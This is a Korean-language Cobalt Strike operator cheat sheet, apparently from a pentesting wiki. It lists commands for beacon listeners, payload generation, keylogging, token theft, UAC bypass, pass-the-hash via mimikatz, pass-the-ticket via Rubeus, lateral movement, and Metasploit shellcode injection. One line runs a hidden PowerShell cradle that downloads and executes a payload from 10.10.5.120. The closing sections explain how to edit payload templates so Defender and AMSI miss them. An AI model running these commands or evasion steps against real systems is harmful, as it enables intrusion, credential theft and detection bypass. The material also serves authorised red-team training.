# 코발트 스트라이크

### 리스너

### C2 리스너

`Cobalt Strike -> Listeners -> Add/Edit`를 선택한 다음, 수신할 위치, 사용할 비콘 종류 (http, dns, smb 등) 등을 선택할 수 있습니다.

### Peer2Peer 리스너

이 리스너의 비콘은 C2와 직접 통신할 필요가 없으며, 다른 비콘을 통해 통신할 수 있습니다.

`Cobalt Strike -> Listeners -> Add/Edit`를 선택한 다음, TCP 또는 SMB 비콘을 선택해야 합니다.

* **TCP 비콘은 선택한 포트에 리스너를 설정**합니다. 다른 비콘에서 `connect <ip> <port>` 명령을 사용하여 TCP 비콘에 연결할 수 있습니다.
* **SMB 비콘은 선택한 이름의 파이프네임에서 수신 대기**합니다. SMB 비콘에 연결하려면 `link [target] [pipe]` 명령을 사용해야 합니다.

### 페이로드 생성 및 호스팅

#### 파일에서 페이로드 생성

`Attacks -> Packages ->`&#x20;

* **`HTMLApplication`**은 HTA 파일용입니다.
* **`MS Office Macro`**은 매크로가 포함된 오피스 문서용입니다.
* **`Windows Executable`**은 .exe, .dll 또는 서비스 .exe용입니다.
* **`Windows Executable (S)`**은 **스테이지가 없는** .exe, .dll 또는 서비스 .exe용입니다 (스테이지가 있는 것보다 IoC가 적습니다).

#### 페이로드 생성 및 호스팅

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)`를 선택하면 cobalt strike에서 비콘을 다운로드하기 위한 스크립트/실행 파일이 bitsadmin, exe, powershell 및 python과 같은 형식으로 생성됩니다.

#### 페이로드 호스팅

웹 서버에 호스팅할 파일이 이미 있는 경우 `Attacks -> Web Drive-by -> Host File`로 이동하여 호스팅할 파일과 웹 서버 구성을 선택하십시오.

### 비콘 옵션

<pre class="language-bash"><code class="lang-bash"># 로컬 .NET 이진 파일 실행
execute-assembly &#x3C;/path/to/executable.exe>

# 스크린샷
printscreen    # PrintScr 메서드를 통해 단일 스크린샷 캡처
screenshot     # 단일 스크린샷 캡처
screenwatch    # 데스크톱의 주기적인 스크린샷 캡처
## 보려면 View -> Screenshots로 이동

# 키로거
keylogger [pid] [x86|x64]
## View > Keystrokes에서 눌린 키 확인

# 포트 스캔
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # 다른 프로세스 내에서 포트 스캔 액션 주입
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
# Powershell 모듈 가져오기
powershell-import C:\path\to\PowerView.ps1
powershell &#x3C;여기에 powershell 명령 입력>

# 사용자 위장
## 자격 증명으로 토큰 생성
make_token [DOMAIN\user] [password] # 네트워크에서 사용자를 위장하기 위해 토큰 생성
ls \\computer_name\c$ # 생성된 토큰을 사용하여 컴퓨터의 C$에 액세스 시도
rev2self # make_token으로 생성된 토큰 사용 중지
## make_token 사용 시 이벤트 4624가 생성됩니다. 이 이벤트는 Windows 도메인에서 매우 일반적이지만, 로그온 유형으로 필터링하여 좁힐 수 있습니다. 위에서 언급한대로 LOGON32_LOGON_NEW_CREDENTIALS를 사용하며, 이는 유형 9입니다.

# UAC 우회
elevate svc-exe &#x3C;리스너>
elevate uac-token-duplication &#x3C;리스너>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## pid에서 토큰 도용
## make_token과 유사하지만 프로세스에서 토큰을 도용합니다.
steal_token [pid] # 또한, 이는 로컬 작업이 아닌 네트워크 작업에 유용합니다.
## API 문서에서 알 수 있듯이 이 로그온 유형은 "호출자가 현재 토큰을 복제할 수 있게 합니다". 이것이 Beacon 출력에서 Impersonated &#x3C;current_username>이라고 표시되는 이유입니다. 이는 우리 자신의 복제된 토큰을 위장하고 있기 때문입니다.
ls \\computer_name\c$ # 생성된 토큰을 사용하여 컴퓨터의 C$에 액세스 시도
rev2self # steal_token에서 도용한 토큰 사용 중지

## 새 자격 증명으로 프로세스 실행
spawnas [domain\username] [password] [listener] # C:\와 같은 읽기 권한이 있는 디렉터리에서 실행해야 합니다.
## make_token과 유사하게 Windows 이벤트 4624가 생성됩니다. 로그온 유형은 2(LOGON32_LOGON_INTERACTIVE)입니다. 호출하는 사용자(TargetUserName)와 위장된 사용자(TargetOutboundUserName)가 자세히 표시됩니다.

## 프로세스에 주입
inject [pid] [x64|x86] [listener]
## OpSec 관점에서 권장하지 않습니다. 꼭 필요한 경우에만 크로스 플랫폼 주입을 수행하십시오 (예: x86 -> x64 또는 x64 -> x86).

## 해시 전달
## 이 수정 프로세스는 LSASS 메모리 패치를 필요로 하며, 고위험 작업이므로 로컬 관리자 권한이 필요하며, Protected Process Light (PPL)이 활성화되어 있지 않은 경우에만 실행 가능합니다.
pth [pid] [arch] [DOMAIN\user] [NTLM 해시]
pth [DOMAIN\user] [NTLM 해시]

## mimikatz를 통한 해시 전달
mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM 해시> /run:"powershell -w hidden"
## /run 없이 mimikatz는 cmd.exe를 생성합니다. 데스크톱을 실행 중인 사용자는 쉘을 볼 수 있습니다 (SYSTEM으로 실행 중인 경우 문제 없음)
steal_token &#x3C;pid> # mimikatz가 생성한 프로세스에서 토큰 도용

## 티켓 전달
## 티켓 요청
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;username> /domain:&#x3C;domain> /aes256:&#x3C;aes_keys> /nowrap /opsec
## 새 티켓을 사용하기 위해 새 로그온 세션 생성 (손상된 세션을 덮어쓰지 않기 위해)
make_token &#x3C;domain>\&#x3C;username> DummyPass
## 공격자 컴퓨터에 티켓 작성 및 로드
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## SYSTEM에서 티켓 전달
## 티켓을 사용하여 새 프로세스 생성
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;USERNAME> /domain:&#x3C;DOMAIN> /aes256:&#x3C;AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## 해당 프로세스에서 토큰 도용
steal_token &#x3C;pid>

## 티켓 추출 + 티켓 전달
### 티켓 목록
execute-assembly C:\path\Rubeus.exe triage
### luid로 티켓 덤프
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#
### 새로운 로그온 세션 생성, luid와 processid 기록
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### 생성된 티켓을 로그온 세션에 삽입
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### 마지막으로, 새로운 프로세스에서 토큰을 도용
steal_token &#x3C;pid>

# 측면 이동
## 토큰이 생성되었다면 사용될 것입니다.
jump [method] [target] [listener]
## 메소드:
## psexec                    x86   서비스를 사용하여 서비스 EXE 아티팩트 실행
## psexec64                  x64   서비스를 사용하여 서비스 EXE 아티팩트 실행
## psexec_psh                x86   서비스를 사용하여 PowerShell 원라이너 실행
## winrm                     x86   WinRM을 통해 PowerShell 스크립트 실행
## winrm64                   x64   WinRM을 통해 PowerShell 스크립트 실행

remote-exec [method] [target] [command]
## 메소드:
<strong>## psexec                          서비스 제어 관리자를 통한 원격 실행
</strong>## winrm                           WinRM을 통한 원격 실행 (PowerShell)
## wmi                             WMI를 통한 원격 실행

## wmi를 사용하여 비콘을 실행하려면 (jump 명령에 없음) 비콘을 업로드하고 실행하십시오.
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# 세션을 Metasploit에 전달 - 리스너를 통해
## Metasploit 호스트에서
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## Cobalt에서: Listeners > Add 및 Payload를 Foreign HTTP로 설정합니다. Host를 10.10.5.120로, Port를 8080으로 설정하고 저장을 클릭합니다.
beacon> spawn metasploit
## 외부 리스너로는 x86 Meterpreter 세션만 생성할 수 있습니다.

# 세션을 Metasploit에 전달 - 쉘코드 인젝션을 통해
## Metasploit 호스트에서
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
## msfvenom을 실행하고 multi/handler 리스너를 준비합니다.

## bin 파일을 cobalt strike 호스트로 복사합니다.
ps
shinject &#x3C;pid> x64 C:\Payloads\msf.bin # x64 프로세스에 metasploit 쉘코드를 인젝션합니다.

# Metasploit 세션을 cobalt strike에 전달
## stageless Beacon 쉘코드를 생성하려면, Attacks > Packages > Windows Executable (S)로 이동하고 원하는 리스너를 선택한 다음 Output 유형으로 Raw를 선택하고 Use x64 payload를 선택합니다.
## metasploit에서 post/windows/manage/shellcode_inject를 사용하여 생성된 cobalt strike 쉘코드를 인젝션합니다.


# 피벗
## 팀서버에서 소켓 프록시 열기
beacon> socks 1080

# SSH 연결
beacon> ssh 10.10.17.12:22 username password</code></pre>

## AV 회피

### Artifact Kit

일반적으로 `/opt/cobaltstrike/artifact-kit`에서 cobalt strike가 이진 비콘을 생성하는 데 사용할 코드와 미리 컴파일된 템플릿 (`/src-common`)을 찾을 수 있습니다.

[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)를 사용하여 생성된 백도어(또는 컴파일된 템플릿)로 defender가 트리거되는 원인을 찾을 수 있습니다. 일반적으로 문자열입니다. 따라서 백도어를 생성하는 코드에서 해당 문자열이 최종 이진 파일에 나타나지 않도록 수정할 수 있습니다.

코드를 수정한 후 동일한 디렉토리에서 `./build.sh`를 실행하고 `dist-pipe/` 폴더를 Windows 클라이언트의 `C:\Tools\cobaltstrike\ArtifactKit`에 복사합니다.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
잊지 말고 공격적인 스크립트 `dist-pipe\artifact.cna`를 로드하여 Cobalt Strike에게 원하는 디스크 리소스를 사용하도록 지시해야 합니다.

### 리소스 키트

리소스 키트 폴더에는 PowerShell, VBA 및 HTA를 포함한 Cobalt Strike의 스크립트 기반 페이로드의 템플릿이 포함되어 있습니다.

템플릿과 함께 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)를 사용하여 방어자(이 경우 AMSI)가 좋아하지 않는 부분을 찾고 수정할 수 있습니다:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
감지된 라인을 수정하여 감지되지 않는 템플릿을 생성할 수 있습니다.

Cobalt Strike에게 디스크에서 원하는 리소스를 로드하도록 지시하기 위해 공격적인 스크립트 `ResourceKit\resources.cna`를 로드하는 것을 잊지 마세요.
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

